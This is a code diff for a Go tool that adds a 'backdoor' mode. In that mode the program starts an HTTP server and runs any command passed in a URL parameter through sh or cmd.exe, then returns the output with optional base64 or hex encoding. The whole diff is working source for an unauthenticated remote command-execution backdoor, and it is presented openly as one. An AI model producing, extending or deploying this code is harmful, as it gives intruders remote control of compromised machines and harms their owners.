@@ -9,12 +9,15 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"strings"
+	"runtime"
 	"time"
 )
 
 var execGlobalOutput string = fmt.Sprintf("[+] PID %d\n", os.Getpid())
-var entryptType string = ""
+var systemOS string = runtime.GOOS
+var encryptType string = ""
+var workType string = ""
+var paramName string = ""
 
 func toBase64(str string) string {
 	str_bytes := []byte(str)
@@ -33,8 +36,29 @@ func toBase64Hex(str string) string {
 	return str_b64hex
 }
 
-func getOutputContinually(name string, args ...string) {
-	cmd := exec.Command(name, args...)
+func getOutputDirectly(commandStr string) {
+	var shell [2]string
+	if systemOS == "linux" || systemOS == "darwin" {
+		shell[0], shell[1] = "sh", "-c"
+	} else {
+		shell[0], shell[1] = "C:\\Windows\\System32\\cmd.exe", "/c"
+	}
+	cmd := exec.Command(shell[0], shell[1], commandStr)
+	output, err := cmd.Output() // 等到命令执行完, 一次性获取输出
+	if err != nil {
+		panic(err)
+	}
+	execGlobalOutput += string(output)
+}
+
+func getOutputContinually(commandStr string) {
+	var shell [2]string
+	if systemOS == "linux" || systemOS == "darwin" {
+		shell[0], shell[1] = "sh", "-c"
+	} else {
+		shell[0], shell[1] = "C:\\Windows\\System32\\cmd.exe", "/c"
+	}
+	cmd := exec.Command(shell[0], shell[1], commandStr)
 	closed := make(chan struct{})
 	defer close(closed)
 
@@ -63,8 +87,17 @@ func getOutputContinually(name string, args ...string) {
 
 func balabala(writer http.ResponseWriter, request *http.Request) {
 	var data string
+	if workType == "backdoor" {
+		err := request.ParseForm()
+		if err != nil {
+			return
+		}
+		values := request.Form[paramName][0]
+		execGlobalOutput = fmt.Sprintf("[+] PID %d\n", os.Getpid())
+		getOutputDirectly(values)
+	}
 
-	switch entryptType {
+	switch encryptType {
 	case "base64":
 		data = toBase64(execGlobalOutput)
 	case "hex":
@@ -74,7 +107,10 @@ func balabala(writer http.ResponseWriter, request *http.Request) {
 	default:
 		data = execGlobalOutput
 	}
-	writer.Write([]byte(data))
+	_, err := writer.Write([]byte(data))
+	if err != nil {
+		return
+	}
 }
 
 func httpserver(ip string, port string) {
@@ -89,23 +125,30 @@ func httpserver(ip string, port string) {
 
 func main() {
 	var (
-		ip      string
-		port    string
-		command string
-		encrypt string
-		maxtime int
+		ip       string
+		port     string
+		command  string
+		encrypt  string
+		param    string
+		maxtime  int
+		worktype string
 	)
 	flag.StringVar(&ip, "ip", "0.0.0.0", "IP")
 	flag.StringVar(&port, "port", "443", "Port")
 	flag.StringVar(&command, "cmd", "whoami", "Command to exec")
 	flag.StringVar(&encrypt, "encrypt", "", "Encrypt type, support: base64, hex, base64hex")
 	flag.IntVar(&maxtime, "time", 20, "Set alive max time(seconds), program will exit after this seconds. Use 0 to make program always alive")
+	flag.StringVar(&worktype, "w", "once", "Run Type, support: once, backdoor.\n'once' type just execute '-cmd' value;\n'backdoor' type need GET param to transmit command(Use '-param' to set URL param)")
+	flag.StringVar(&param, "param", "id", "Set URL param name when using 'backdoor' type")
 	flag.Parse()
 
-	commandArgs := strings.Fields(command)
-	entryptType = encrypt
+	encryptType = encrypt
+	paramName = param
+	workType = worktype
+
 	go httpserver(ip, port)
-	go getOutputContinually(commandArgs[0], commandArgs[1:]...)
+	go getOutputContinually(command)
+
 	if maxtime == 0 {
 		for {
 			time.Sleep(5 * time.Second)
